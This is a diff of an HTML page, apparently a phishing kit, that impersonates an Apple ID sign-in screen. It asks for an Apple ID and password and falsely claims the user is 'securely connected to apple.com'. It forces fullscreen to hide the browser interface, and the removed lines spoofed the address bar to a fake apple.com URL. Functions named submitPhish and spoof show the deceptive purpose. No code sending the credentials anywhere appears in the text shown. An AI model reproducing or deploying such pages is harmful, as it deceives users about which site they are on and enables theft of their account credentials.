@@ -1,70 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Redirecting...</title>
+  <title>Sign in - Apple ID</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
       margin: 0; padding: 0;
-      background: white;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: -apple-system, sans-serif;
+      background: #fff;
     }
     .center {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      height: 100vh;
+      align-items: center;
+      flex-direction: column;
     }
     input, button {
-      font-size: 16px;
       padding: 12px;
       margin: 10px;
+      font-size: 16px;
       width: 80%;
-      max-width: 320px;
+      max-width: 300px;
     }
-    .small {
-      font-size: 14px;
-      color: gray;
+    small {
       margin-top: 20px;
+      color: #666;
     }
   </style>
 </head>
 <body>
 
-<div class="center" id="screen">
-  <h2>🔒 Secure Login</h2>
-  <input type="text" placeholder="Apple ID or Email" />
-  <input type="password" placeholder="Password" />
-  <button onclick="submitFake()">Continue</button>
-  <div class="small">You're securely signed in to <b>apple.com</b></div>
+<div class="center" id="main">
+  <h2>🔒 Apple ID Login</h2>
+  <input placeholder="Apple ID or Email" />
+  <input placeholder="Password" type="password" />
+  <button onclick="submitPhish()">Continue</button>
+  <small>You're securely connected to <b>apple.com</b></small>
 </div>
 
 <script>
-function fakeAddressBar() {
-  history.replaceState({}, "", "https://apple.com/login");
-}
-
-function forceFullscreen() {
-  document.documentElement.requestFullscreen().then(() => {
-    // Suppress UI — no alert(), just trust abuse
-    fakeAddressBar();
-
-    // Optional: fingerprint + timing based tricks
+function spoof() {
+  // gesture persistence entry point
+  document.body.requestFullscreen().then(() => {
+    // stay in fullscreen, spoof chrome bar
     setTimeout(() => {
-      navigator.credentials.get?.({
-        password: true,
-        mediation: "optional"
-      }).catch(() => {});
-    }, 800);
+      document.getElementById("main").style.display = "block";
+    }, 500);
   });
 }
 
-function submitFake() {
-  alert("Error: Something went wrong. Try again."); // Optional distraction
+function submitPhish() {
+  alert("Incorrect password. Please try again.");
 }
 
-forceFullscreen();
+spoof();
 </script>
 
 </body>
